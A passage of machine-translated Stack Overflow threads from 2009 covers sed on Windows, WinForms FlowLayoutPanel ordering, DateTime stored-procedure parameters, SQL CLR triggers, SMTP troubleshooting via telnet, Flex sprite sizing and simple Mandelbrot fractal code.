请注意，[**`sed`**](http://gnuwin32.sourceforge.net/packages/sed.htm)它可用于 Windows，以及[一大堆](http://gnuwin32.sourceforge.net/packages.html)其他 GNU 实用程序。我不确定您是否在问是否有等效的工具，或者一旦您获得了该工具，如何实际做到这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T21:51:46.063

```
D:\tmp\sed.exe -f sedscript.sed D:\tmp\test.txt >c:\tmp\test2.txt

/^\[产品特点\]$/,/^\[Dm$/{
 /^\[产品特点\]$/!{
 /^\[Dm$/!d
 }
 }

```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T21:04:13.680

我查看了 cmd 和 power shell - 找不到任何有用的东西。让自己成为 ActivePerl？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T21:04:31.900

如果您信任[此答案](https://stackoverflow.com/questions/127318#127567)的“类似sed”的VB脚本...

sed.vbs：

```
Dim pat, patparts, rxp, inp
pat = WScript.Arguments(0)
patparts = Split(pat,"/")
Set rxp = new RegExp
rxp.Global = True
rxp.Multiline = False
rxp.Pattern = patparts(1)
Do While Not WScript.StdIn.AtEndOfStream
  inp = WScript.StdIn.ReadLine()
  WScript.Echo rxp.Replace(inp, patparts(2))
Loop 
```

您可以输入
**`cscript /Nologo sed.vbs s/^\d+\s*$/ < in.txt`**（in.txt 是您的初始文本）

您将获得预期的输出...

```
^\d+\s*$ 
```

将针对以一个或多个数字开头的任何行，然后一行中的 0 个或多个空格。

* * *

这不是最好的“纯 sed”解决方案，它实际上不能删除行，但这是一个原生的“符合 vista”的解决方案......

* * *

实际上，以下故意解释“ `d`sed-command”的黑客可以“删除”行：

```
Dim pat, patparts, rxp, inp
pat = WScript.Arguments(0)
patparts = Split(pat,"/")
Set rxp = new RegExp
rxp.Global = True
rxp.Multiline = False
rxp.Pattern = patparts(1)
Do While Not WScript.StdIn.AtEndOfStream
  inp = WScript.StdIn.ReadLine()
  out = rxp.Replace(inp, patparts(2))
  if not patparts(2)="d" or not out="d" Then
    WScript.Echo out
  end if
Loop 
```

**`cscript /Nologo sed.vbs s/^\d+\s*$/ < in.txt`**实际上会产生：

```
[aaa bbb]
[ccc ddd] 
```

* * *

在 .bat 中，您可以有一个 sed.bat：

```
cscript /Nologo sed.vbs %1 < %2 
```

然后像这样执行那个.bat：

```
C:\prog\sed>sed.bat s/^\d+\s*$/d in.txt 
```

# winforms - 流布局面板中控件的重新排序

> ID：425867
> 
> 赞同：14
> 
> 时间：2009-01-08T20:49:34.300
> 
> 标签：winforms, controls, combobox, flowlayoutpanel

我在 C# winform 应用程序中使用 flowlayoutPanel 时遇到问题。我基本上拥有的是一个包含 3 个部分的流程布局面板。

第 #1 节是一组 2 个控件 .. 两个下拉控件，它们始终以相同的顺序排列，在所有实例中始终可见

第 2 部分是一组 5 个不同的控件...基于一系列因素，5 个控件中的 1 个变为可见，所有其他控件的 Visible 属性设置为 false

第 3 节是一组 3 个控件 .. 与第 1 节一样，它们始终以相同的顺序排列并且始终可见。

所以这归结为第 2 部分是可变的，其他部分是静态的。

问题出现在第 #2 节...当我更改任何控件的可见性时，它们看起来都很好（IE ... 第 1 节然后第 2 节然后第 3 节）...除了我将组合框控件设置为可见....在这种情况下，并且仅在这种情况下..订单变为（第 1 节然后第 3 节然后第 2 节）...我无法弄清楚是什么导致排序不同步那个案子。

我基本上在我的方法开始时所做的是将所有控件设置为 Visible = false ... 然后我设置第 1 节 Visible = true ... 然后循环通过第 2 节的条件并设置适当的控件 Visible = true 最后设置第 3 节控件可见 = true。

有人对流布局面板控件排序有任何经验吗？我无法弄清楚 ComboBox 发生了什么。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2009-07-30T15:30:10.037

内部`FlowLayoutPanel.Controls`是一个调用的方法函数`SetChildIndex(Control c, int index)`，它允许您将对象设置为特定索引。

由于 FlowLayoutPanel 使用控件的索引来确定绘制它们的顺序，因此您可以将其设置为您想要交换的任何控件的索引，它会将该控件的索引增加一个，然后再增加一个。

这是我[博客](http://gkindel.blogspot.com/2009/07/drag-and-drop-picturebox-on.html)中关于在 FlowLayoutPanel 中重新排序 PictureBoxes 的片段。

在名为的 WinForm 上添加 FlowLayoutPanel `flowLayoutPanel1`：

```
public partial class TestForm: Form
{
   public TestForm()
    {
        InitializeComponent();
        this.flowLayoutPanel1.AllowDrop = true
    }

    private void AddImageToBlog(System.Drawing.Image image)
    {
        PictureBox pbox = new PictureBox();
        pbox.SizeMode = PictureBoxSizeMode.Zoom;            
        pbox.Height = (_picturebox_height * _ScaleFactor);
        pbox.Width = (_picturebox_width * _ScaleFactor);
        pbox.Visible = true;
        pbox.Image = image;

        pbox.MouseDown += new MouseEventHandler(pbox_MouseDown);
        pbox.DragOver += new DragEventHandler(pbox_DragOver);            
        pbox.AllowDrop = true;
        flpNewBlog.Controls.Add(pbox);
    }

    void pbox_DragOver(object sender, DragEventArgs e)
    {
        base.OnDragOver(e);
        // is another dragable
        if (e.Data.GetData(typeof(PictureBox)) != null)
        {
            FlowLayoutPanel p = (FlowLayoutPanel)(sender as PictureBox).Parent;                 
            //Current Position             
            int myIndex = p.Controls.GetChildIndex((sender as PictureBox));

            //Dragged to control to location of next picturebox
            PictureBox q = (PictureBox) e.Data.GetData(typeof(PictureBox));                
            p.Controls.SetChildIndex(q, myIndex);
        }           
    }

    void pbox_MouseDown(object sender, MouseEventArgs e)
    {
        base.OnMouseDown(e);
        DoDragDrop(sender, DragDropEffects.All);
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-08T20:56:29.763

在第 2 节中放置另一个 flowlayoutpanel 是否更容易，然后将第 2 节控件放入其中？这样，您顶部面板中的可见控件就不会改变，您也不必担心订购问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2010-10-04T09:32:22.737

您可以重新排序流程面板上的控件，更改控件的父属性并按照您需要的顺序重新分配父属性。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-07-11T13:30:12.777

试试这个通用解决方案，您可以在其中根据用户控件中的属性对控件进行排序。

```
// When adding and removing controls, the order is not kept.
var runsOrderedByStartDate = this.nodesFlowLayoutPanel.Controls.Cast<RunNodeControl>().Select(_ => new { StartDate = _.StartDateTime, RunControl = _ }).OrderBy(_ => _.StartDate).ToList();

// Sets index of controls according to their index in the ordered collection
foreach (var anonKeyValue in runsOrderedByStartDate)
{
    this.nodesFlowLayoutPanel.Controls.SetChildIndex(anonKeyValue.RunControl, runsOrderedByStartDate.IndexOf(anonKeyValue));
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-02-11T20:00:28.787

`SetChildIndex`不会重置 flowlayout 面板中控件的顺序。所以我们执行`FlowLayoutPanel.GetNextControl(q, true)`的时候输出是不正确的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-03-21T17:27:30.957

对于基本控件排序，控制 flowlayoutPanel 中控件顺序的最简单方法是将 flowlayoutPanel TabStop 属性设置为 true。将控件的 tabstop 属性设置为 True 并将 Tab 键顺序设置为您希望控件出现的顺序。

# c# - 在存储过程的 SqlParameter 中使用 DateTime，格式错误

> ID：425870
> 
> 赞同：28
> 
> 时间：2009-01-08T20:49:57.030
> 
> 标签：c#, sql-server, datetime, stored-procedures, .net-2.0

我正在尝试从 C#、.NET 2.0 调用存储过程（在 SQL 2005 服务器上），并将`DateTime`其用作`SqlParameter`. 存储过程中的 SQL 类型是“日期时间”。

从 SQL Management Studio 执行存储过程可以正常工作。但是每次我从 C# 调用它时，我都会收到有关日期格式的错误。

当我运行 SQL Profiler 来观察调用时，我会复制粘贴`exec`调用以查看发生了什么。这些是我对我所尝试的观察和笔记：

1）如果我`DateTime`直接将 in 作为 a`DateTime`或转换为`SqlDateTime`，则该字段由一对单引号包围，例如

```
@Date_Of_Birth=N''1/8/2009 8:06:17 PM'' 
```

2）如果我将`DateTime`in 作为字符串传递，我只会得到单引号

3) 使用`SqlDateTime.ToSqlString()`不会产生 UTC 格式的日期时间字符串（即使在转换为通用时间之后）

4) 使用`DateTime.ToString()`不会产生 UTC 格式的日期时间字符串。

5) 手动设置`DbType`to`SqlParameter`不会`DateTime`改变上述观察结果。

那么，我的问题是，究竟如何让 C# 在`SqlParameter`? 当然这是一个常见的用例，为什么很难开始工作？我似乎无法转换`DateTime`为与 SQL 兼容的字符串（例如 '2009-01-08T08:22:45'）

**编辑**

RE: BFree，实际执行sproc的代码如下：

```
using (SqlCommand sprocCommand = new SqlCommand(sprocName))
{
    sprocCommand.Connection = transaction.Connection;
    sprocCommand.Transaction = transaction;
    sprocCommand.CommandType = System.Data.CommandType.StoredProcedure;
    sprocCommand.Parameters.AddRange(parameters.ToArray());
    sprocCommand.ExecuteNonQuery();
} 
```

要详细了解我的尝试：

```
parameters.Add(new SqlParameter("@Date_Of_Birth", DOB));

parameters.Add(new SqlParameter("@Date_Of_Birth", DOB.ToUniversalTime()));

parameters.Add(new SqlParameter("@Date_Of_Birth", 
    DOB.ToUniversalTime().ToString()));

SqlParameter param = new SqlParameter("@Date_Of_Birth", 
    System.Data.SqlDbType.DateTime);
param.Value = DOB.ToUniversalTime();
parameters.Add(param);

SqlParameter param = new SqlParameter("@Date_Of_Birth", 
    SqlDbType.DateTime);
param.Value = new SqlDateTime(DOB.ToUniversalTime());
parameters.Add(param);

parameters.Add(new SqlParameter("@Date_Of_Birth", 
    new SqlDateTime(DOB.ToUniversalTime()).ToSqlString())); 
```

**附加编辑**

我认为最有可能工作的一个：

```
SqlParameter param = new SqlParameter("@Date_Of_Birth",  
    System.Data.SqlDbType.DateTime);
param.Value = DOB; 
```

在 exec 调用中产生此值，如 SQL Profiler 中所示

```
@Date_Of_Birth=''2009-01-08 15:08:21:813'' 
```

如果我将其修改为：

```
@Date_Of_Birth='2009-01-08T15:08:21' 
```

它可以工作，但它不会用一对单引号解析，并且它不会`DateTime`正确转换为日期和时间之间的空格以及最后的毫秒数。

**更新与成功**

在下面的请求之后，我复制/粘贴了上面的代码。为了简洁起见，我在这里和那里修剪了一些东西。原来我的问题出在我遗漏的代码中，我相信你们中的任何人都会立即发现。我已经将我的存储过程调用包装在一个事务中。原来我根本没有做`transaction.Commit()`！！！！我很惭愧地说，但你有它。

我仍然不知道从探查器返回的语法发生了什么。一位同事从他的计算机上查看了他自己的分析器实例，它返回了正确的语法。从我的分析器中观察非常相同的执行显示了不正确的语法。它充当了红鲱鱼，让我相信存在查询语法问题，而不是更简单和真实的答案，即我需要提交事务！

我将下面的答案标记为正确，并对其他人投了一些赞成票，因为他们毕竟回答了这个问题，即使他们没有解决我的具体（脑残）问题。

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2009-01-08T20:55:04.727

你是如何设置的[`SqlParameter`](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparameter.aspx)？您应该将[`SqlDbType`属性](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparameter.sqldbtype.aspx)设置为[`SqlDbType.DateTime`](http://msdn.microsoft.com/en-us/library/system.data.sqldbtype.aspx)，然后将其[`DateTime`](http://msdn.microsoft.com/en-us/library/system.datetime.aspx)直接传递给参数（不要转换为字符串，然后您会提出一堆问题）。

您应该能够将值放入数据库。如果没有，这里有一个非常简单的例子来说明如何做到这一点：

```
static void Main(string[] args)
{
    // Create the connection.
    using (SqlConnection connection = new SqlConnection(@"Data Source=..."))
    {
        // Open the connection.
        connection.Open();

        // Create the command.
        using (SqlCommand command = new SqlCommand("xsp_Test", connection))
        {
            // Set the command type.
            command.CommandType = System.Data.CommandType.StoredProcedure;

            // Add the parameter.
            SqlParameter parameter = command.Parameters.Add("@dt",
                System.Data.SqlDbType.DateTime);

            // Set the value.
            parameter.Value = DateTime.Now;

            // Make the call.
            command.ExecuteNonQuery();
        }
    }
} 
```

我认为这里的部分问题是您担心时间是 UTC 的事实没有被传达给 SQL Server。为此，您不应该这样做，因为 SQL Server 不知道特定时间位于特定区域设置/时区。

如果要存储 UTC 值，请在将其传递给 SQL Server 之前将其转换为 UTC（除非您的服务器与生成`DateTime`. SQL Server 将存储这个值，当你取回它时，如果你想在本地时间显示它，你必须自己做（`DateTime`结构很容易做到）。

话虽如此，如果您执行转换，然后将转换后的 UTC 日期（通过调用[`ToUniversalTime`方法](http://msdn.microsoft.com/en-us/library/system.datetime.touniversaltime.aspx)获得的日期，而不是通过转换为字符串）传递给存储过程。

并且当您取回值时，调用该[`ToLocalTime`方法](http://msdn.microsoft.com/en-us/library/system.datetime.tolocaltime.aspx)以获取本地时区的时间。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-08T22:55:49.710

这是我添加参数的方法：

```
sprocCommand.Parameters.Add(New SqlParameter("@Date_Of_Birth",Data.SqlDbType.DateTime))
sprocCommand.Parameters("@Date_Of_Birth").Value = DOB 
```

我假设当你写出 DOB 时没有引号。

您是否使用第三方控件来获取日期？我在从其中一些生成文本值的方式上遇到了问题。

最后，如果您在不引用 DOB 的情况下键入参数的 .Value 属性，它是否有效？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T21:14:46.450

只需使用：

```
 param.AddWithValue("@Date_Of_Birth",DOB); 
```

这将解决你所有的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-09T10:48:51.550

如果您使用`Microsoft.ApplicationBlocks.Data`它，它将使您的存储过程成为单行

```
SqlHelper.ExecuteNonQuery(ConnectionString, "SprocName", DOB) 
```

哦，我认为 casperOne 是正确的...如果您想确保多个时区的日期时间正确，那么只需将值转换为 UTC，然后再将值发送到 SQL Server

```
SqlHelper.ExecuteNonQuery(ConnectionString, "SprocName", DOB.ToUniversalTime()) 
```

# java - 是否可以通过 JMX 管理 C++ 应用程序？

> ID：425891
> 
> 赞同：1
> 
> 时间：2009-01-08T20:53:46.790
> 
> 标签：java, c++, distributed, jmx, corba

我们有一个包含 C++ 和 Java 模块的分布式应用程序，通过 CORBA 进行交互。

是否有任何 C++ 库/工具可以将“变量”和“方法”暴露给 JMX 工具（以创建统一管理）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T22:08:31.460

因此，即使您的应用程序是 C++ 和 Java，您只是希望将 C++ 模块属性公开给 JMX 管理器吗？

如果是这样，或者实际上，即使您同时公开两者，我也会考虑为这两个实例使用 SNMP 库，因为试图让 C++ 直接支持 JMX 可能很麻烦。JMX 和 SNMP 具有广泛的互操作性，我很确定您可以为您的 C++ 组件找到 SNMP 库（我*知道*您可以为 Java 找到），您最好坚持使用一种协议，而不是使用一种用于 C++ 和一种用于 Java。

最后一部分（可能也是最简单的）是为您的 JMX 控制台、管理器或您正在使用的任何东西找到一个 SNMP“桥”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T22:54:35.453

如果我要尝试这个，我将在 C++ 端和 Java 端都有一个组件，它们可以相互通信（可能使用 XML）。Java 端将是您可以与之交互的实际 JXM MBean 组件，而 C++ 端将在该端进行反射。

# sql - SQL CLR 触发器可以做到这一点吗？或者，还有更好的方法？

> ID：425898
> 
> 赞同：7
> 
> 时间：2009-01-08T20:55:23.087
> 
> 标签：sql, sql-server, tsql, triggers, sqlclr

我想编写一个监视数据库表的服务（可能在 c# 中）。当一条记录插入到表中时，我希望服务获取新插入的数据，并用它执行一些复杂的业务逻辑（对于 TSQL 来说太复杂了）。

一种选择是让服务定期检查表以查看是否已插入新记录。这样做的问题是我希望服务在插入发生时立即知道插入，并且我不想破坏数据库性能。

做一些研究，似乎写一个 CLR 触发器可以完成这项工作。我可以在 c# 中编写在插入发生时触发的触发器，然后将新插入的数据发送到 Windows 或 WCF 服务。

您认为 SQL CLR 触发器的使用是否良好（甚至可能）？

关于如何实现这一点的任何其他想法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-08T21:01:17.973

可能您应该将后处理与插入分离：

在 Insert 触发器中，将记录的 PK 添加到队列表中。

在一个单独的服务中，从队列表中读取并执行您的复杂操作。完成后，将记录标记为已处理（连同错误/状态信息），或从队列中删除记录。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T21:00:05.667

您所描述的有时称为作业队列或消息队列。有几个关于使用 DBMS 表（以及其他技术）执行此操作的线程，您可以通过搜索找到。

我会考虑使用触发器做任何类似的事情，因为这是对数据库功能的不当使用，无论如何都很容易遇到麻烦。触发器最适合用于低开销的 dbms 结构功能（例如细粒度的引用完整性检查），并且需要轻量级和同步。可以做到，但可能不是一个好主意。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-10T23:49:13.553

我建议在调用[SQL Server Service Broker](http://msdn.microsoft.com/en-us/library/ms345108.aspx)的表上设置一个触发器，然后（异步）执行一个 CLR 存储过程，该过程在不同的线程中完成所有工作。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T21:00:27.320

我有一个每分钟轮询数据库的服务，它不会导致太多的性能问题，而且它是一个干净的解决方案。另外，如果您的服务或其他 wcf 端点不存在，您的触发器将失败或丢失，您将不得不在以后轮询。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-08T22:01:12.363

我不建议为此使用 CLR 触发器或任何类型的触发器。您正在向严重的可维护性和潜在的锁定问题敞开心扉。（如果您在插入后不关心@@identity 并且您永远不会锁定审计/队列表，则可以接受将内容放入审计/队列表的非常简单的触发器）

相反，您应该从您的应用程序/orm 触发将内容插入到队列表中，并定期处理此队列。这可以通过在您的 ORM 中进行事务或启动存储过程来完成，开始事务以原子方式提交更改和审计/队列。（注意这里的锁定）

如果您需要立即采取行动，请在对表执行插入/更新/删除操作后查看生成作业以清除队列，然后

还要确保您每分钟左右仔细检查一次队列，以防后台进程未正确启动。如果它是一个 Web 应用程序并且您想避免产生线程，您可以与后台进程通信以清除队列。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2009-01-09T13:52:09.423

为什么不在存储过程中实现插入，插入后在过程中做业务逻辑呢？它有什么复杂到不能用 T-SQL 编写的？

# apache-flex - 如何计算精灵的大小？

> ID：425902
> 
> 赞同：0
> 
> 时间：2009-01-08T20:56:13.040
> 
> 标签：apache-flex, flash, actionscript-3, flex3

我有一个精灵，我在其中进行了一些自定义绘图，但我希望容器知道正确定位精灵的位置。为此，容器需要知道精灵有多大。UIComponents 经历了一个测量阶段，但精灵没有。如何计算精灵的大小？

**编辑：**我正在 Event.ENTER_FRAME 中进行绘图，并且它是动画的，所以我无法提前知道它会有多大。UIComponent 有一个测量功能，我想创建类似的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-11T20:46:09.557

据我所知，确切的答案是，您无法提前知道，您必须实际绘制精灵以确定它的大小。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T21:30:06.293

精灵采用您在其中绘制的大小。在您在其中绘制某些内容之前，它根本没有大小。如果您的应用程序允许，您可以先绘制边框（可能是矩形），然后测量精灵。但是以后不要画到边界之外。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-12T17:56:40.387

此外，根据您要绘制的内容，您可以使用数学来预先计算最终尺寸。

即如果你正在画一个圆圈，你可以使用数学来计算出最终的高度/宽度。

麦克风

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T21:53:45.280

看看这里——我希望这能回答你的问题：

```
<?xml version="1.0" encoding="utf-8"?>
<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" layout="absolute">

    <mx:Script>
        <![CDATA[

            import mx.core.UIComponent;

            private var s:Sprite;
            private var w:UIComponent;

            override protected function createChildren():void
            {           
                super.createChildren();

                if (!s)
                    s = getSprite();

                w = new UIComponent();

                trace("The sprite measures " + s.width + " by " + s.height + ".");

                w.addChild(s);
                box.addChild(w);
            }

            private function getSprite():Sprite
            {
                var s:Sprite = new Sprite();
                s.graphics.lineStyle(1, 0xFFFFFF);
                s.graphics.beginFill(0xFFFFFF, 1);
                s.graphics.drawRect(0, 0, Math.floor(Math.random() * 1000), Math.floor(Math.random() * 1000));
                s.graphics.endFill();

                return s;
            }

        ]]>
    </mx:Script>

    <mx:Box id="box" backgroundColor="#FFFFFF" />

</mx:Application> 
```

如果你运行这个，trace 语句应该显示绘制的 Sprite 的高度和宽度，这是随机生成的。换句话说，您可以通过简单地查询它的高度和宽度属性来获得精灵的高度和宽度。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-15T11:02:13.507

如果需要根据 Sprite 的宽高来布局其他一些组件，但在实际绘制之前，可以在 flash.display.Shape 对象上进行绘制，以此大小为参考，然后将 Shape 附加到 Sprite 上。

# c# - .Net 中的内置字符大小写函数

> ID：425908
> 
> 赞同：4
> 
> 时间：2009-01-08T20:56:51.417
> 
> 标签：c#, .net, string

.Net 中是否有任何允许大写字符串或处理正确大小写的内置函数？我知道 Microsoft.VB 命名空间中有一些地方，但如果可能的话，我想避免这些。

我知道 string.ToUpper 和 string.ToLower() 等函数，但它会影响整个字符串。我正在寻找这样的东西：

```
var myString = "micah";
myString = myString.Format(FormattingOptions.Capitalize) //Micah 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-08T21:05:44.877

只是为了将另一种选择加入其中。这将大写给定字符串中的每个单词：

```
public static string ToTitleCase(string inputString)

{

   System.Globalization.CultureInfo cultureInfo =
   System.Threading.Thread.CurrentThread.CurrentCulture;
   System.Globalization.TextInfo textInfo = cultureInfo.TextInfo;
   return textInfo.ToTitleCase(inputString.ToLower());

} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-08T21:06:54.470

有

```
System.Threading.Thread.CurrentThread.CurrentCulture.TextInfo.ToTitleCase(string str) 
```

将字符串中的每个单词大写。[ToTitleCase](http://msdn.microsoft.com/en-us/library/system.globalization.textinfo.totitlecase.aspx)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T21:07:32.610

有一个免费的库可用...[字符串处理库](http://www.vcskicks.com/components/string-library.php)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-09T04:27:51.380

这适用于 VB.NET

StrConv（输入，VbStrConv.ProperCase）

# c# - SMTP 电子邮件：邮箱不可用。服务器响应是：没有这样的收件人

> ID：425924
> 
> 赞同：0
> 
> 时间：2009-01-08T21:01:00.503
> 
> 标签：c#, email, smtp

我为一般支持问题创建了一个新邮箱。当我尝试通过 SMTP 发送电子邮件时，我收到以下错误：

> 信箱不可用。服务器响应是：没有这样的收件人

当我发送到同一域中的其他电子邮件地址时，我可以通过 Outlook 和 SMTP 向该邮箱发送电子邮件。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-08T21:16:44.683

SMTP 的伟大之处在于它很容易欺骗对话。SMTP 的可怕之处还在于它很容易欺骗对话。之所以如此出色，是因为如果您想弄清楚 SMTP 连接中出了什么问题，您只需“telnet mailhost 25”并开始发出 SMTP 命令，例如：

```
HELO example.com
MAIL FROM: <me@me.com>
RCPT TO: <him@him.com>
DATA
Subject: test message
From: Me <me@me.com>
To: Him <him@him.com>

test message
.
QUIT 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T21:05:31.197

您的 DNS 配置是否正确？您需要一个 MX 记录，指定哪个主机处理该域的传入消息。

顺便说一句，您的帖子缺少一些细节，例如您使用的服务器等。这使得很难找到问题所在。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T21:06:26.390

如果您发布完整的 SMTP 对话（或者至少是您的客户发送的内容），答案可能会突然出现。

或者，如果您正确使用 SMTP，则可能您连接到错误的服务器。您的客户端是否查找 DNS MX 记录以找到正确的 SMTP 主机？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T21:06:32.020

首先，确保地址有效。另外，请确保**发件人**地址有效（这可能是您的问题）。最后，如果这些都不起作用，您应该尝试明确设置 SMTP 服务器。

没有一点代码示例，这是我能想到的最好的建议。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-08T21:11:23.243

贵公司是否有多个邮件服务器？如果您有多个服务器并且尚未推送新创建的帐户，则可能不会返回此类收件人。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-09T14:38:43.903

我实际上使用 Telnet 来诊断问题（感谢 Paul Tomblin 的帖子）。我发现我们的 SMTP 服务器使用 GroupWise（我们使用 Exchange 作为我们的主要电子邮件客户端）。我还必须设置地址以中继到 GroupWise 服务器。

# cocoa-touch - 如何在不扭曲视图的情况下以不同的缩放级别在 UIScrollView 中呈现自定义视图？

> ID：425929
> 
> 赞同：3
> 
> 时间：2009-01-08T21:02:04.417
> 
> 标签：cocoa-touch

场景：

我有一个绘制游戏板的自定义视图（UIView 的子类）。为了能够放大和平移，我将我的视图添加为 UIScrollView 的子视图。这种工作，但游戏板渲染不正确。一切都是模糊的，没有什么是正确的。

问题：

如何强制我的视图以不同的比例正确重绘？我正在为我的视图提供当前比例，并在滚动视图完成放大/缩小后向其发送 setNeedsDisplay 消息，但游戏板仍然呈现不正确。我的视图应该根据缩放级别重新绘制游戏板，但这并没有发生。滚动视图是否对子视图执行通用转换？有没有办法禁用这种行为？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2010-04-09T22:20:53.290

最简单的方法是以非常高的分辨率渲染您的游戏板，然后让 ScrollView 处理自动将其*缩小*到您的显示尺寸。

基本上，将 ScrollView 的 contentSize 设置为较大的值（例如 1024x1024），并让您的游戏板在其中设置一个巨大的视图，大小相同（例如 1024x1024）。然后简单地让 ScrollView 处理*所有*缩放问题。你甚至不需要拦截 setNeedsDisplay 或任何东西；就您的游戏而言，它总是以最高分辨率呈现。

# theory - 如何编程分形？

> ID：425953
> 
> 赞同：78
> 
> 时间：2009-01-08T21:07:22.410
> 
> 标签：theory, fractals

我没有任何编程分形的经验。当然，我看过著名的 Mandelbrot 图像等。

你能给我提供分形的简单算法吗？

编程语言真的无所谓，但我最熟悉actionscript、C#、Java。

我知道如果我在谷歌上搜索分形，我会得到很多（复杂的）信息，但我想从一个简单的算法开始并使用它。

也欢迎提出改进基本算法的建议，比如如何将它们制作成可爱的颜色等。

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2009-01-08T21:28:31.383

Mandelbrot 编程很容易。
我的 quick-n-dirty 代码如下（不保证没有错误，但大纲很好）。

这是轮廓：Mandelbrot 集完全位于半径为 2 的圆内的复数网格中。

因此，首先扫描该矩形区域中的每个点。每个点代表一个复数 (x + yi)。迭代那个复数：

`[new value] = [old-value]^2 + [original-value]`同时跟踪两件事：

1.) 迭代次数

2.) [new-value] 与原点的距离。

如果达到最大迭代次数，则完成。如果与原点的距离大于 2，则完成。

完成后，根据您完成的迭代次数为原始像素着色。然后移动到下一个像素。

```
public void MBrot()
{
    float epsilon = 0.0001; // The step size across the X and Y axis
    float x;
    float y;
    int maxIterations = 10; // increasing this will give you a more detailed fractal
    int maxColors = 256; // Change as appropriate for your display.

    Complex Z;
    Complex C;
    int iterations;
    for(x=-2; x<=2; x+= epsilon)
    {
        for(y=-2; y<=2; y+= epsilon)
        {
            iterations = 0;
            C = new Complex(x, y);
            Z = new Complex(0,0);
            while(Complex.Abs(Z) < 2 && iterations < maxIterations)
            {
                Z = Z*Z + C;
                iterations++;
            }
            Screen.Plot(x,y, iterations % maxColors); //depending on the number of iterations, color a pixel.
        }
    }
} 
```

遗漏的一些细节是：

1.) 准确了解复数的平方是什么以及如何计算它。

2.) 弄清楚如何将 (-2,2) 矩形区域转换为屏幕坐标。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2009-01-08T21:29:13.440

您确实应该从[Mandelbrot 集](https://en.wikipedia.org/wiki/Mandelbrot_set)开始，并了解它的真正含义。

其背后的想法相对简单。你从一个复杂变量的函数开始

> f(z) = z ² + C

其中 z 是一个复*变量*，C 是一个复*常数*。现在从 z = 0 开始对其进行迭代，即计算 z [1] = f(0)、z [2] = f(z [1] )、z [3] = f(z [2] ) 等等。序列z [1] , z [2] , z [3] , ... 有*界*的常数C 的集合是Mandelbrot 集合（维基百科页面上图中的黑色集合）。

在实践中，要绘制 Mandelbrot 集，您应该：

*   在复平面中选择一个矩形（例如，从点 -2-2i 到点 2+2i）。
*   用合适的矩形网格点（例如 400x400 点）覆盖矩形，这些点将映射到显示器上的像素。
*   对于每个点/像素，设 C 为该点，计算，例如，对应的迭代序列 z [1]，z [2]，z [3]，...的 20 项，并检查它是否“趋于无穷大”。在实践中，您可以在迭代时检查 20 个项中的一项的绝对值是否大于 2（如果其中一项大于 2，则保证后续项是无界的）。如果某个 z_k 确实如此，则序列“趋于无穷大”；否则，您可以将其视为有界的。
*   如果某个点 C 对应的序列是有界的，则在图片上用黑色画出对应的像素（因为它属于 Mandelbrot 集）。否则，用另一种颜色绘制它。如果您想玩得开心并制作漂亮的情节，请根据 abs（第 20 项）的大小用不同的颜色绘制它。

关于分形的惊人事实是，我们如何从简单且看似无害的要求中获得极其复杂的集合（特别是 Mandelbrot 集合的*边界）。*

享受！

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-09-18T20:39:04.300

如果复数让您头疼，那么可以使用 L 系统来表示范围广泛的分形。这需要几个层进行交互，但每个层本身都很有趣。

首先你需要一只乌龟。前进、后退、左、右、上笔、下笔。即使没有 L 系统驱动，使用海龟几何图形也可以制作许多有趣的形状。搜索“LOGO 图形”或“海龟图形”。完整的[LOGO](http://en.wikipedia.org/wiki/Logo_(programming_language))系统实际上是使用无括号[剑桥波兰语](http://en.wikipedia.org/wiki/S-expression)语法的[Lisp](http://en.wikipedia.org/wiki/Lisp_(programming_language))编程环境。但是您不必走那么远就可以使用海龟概念获得一些漂亮的照片。

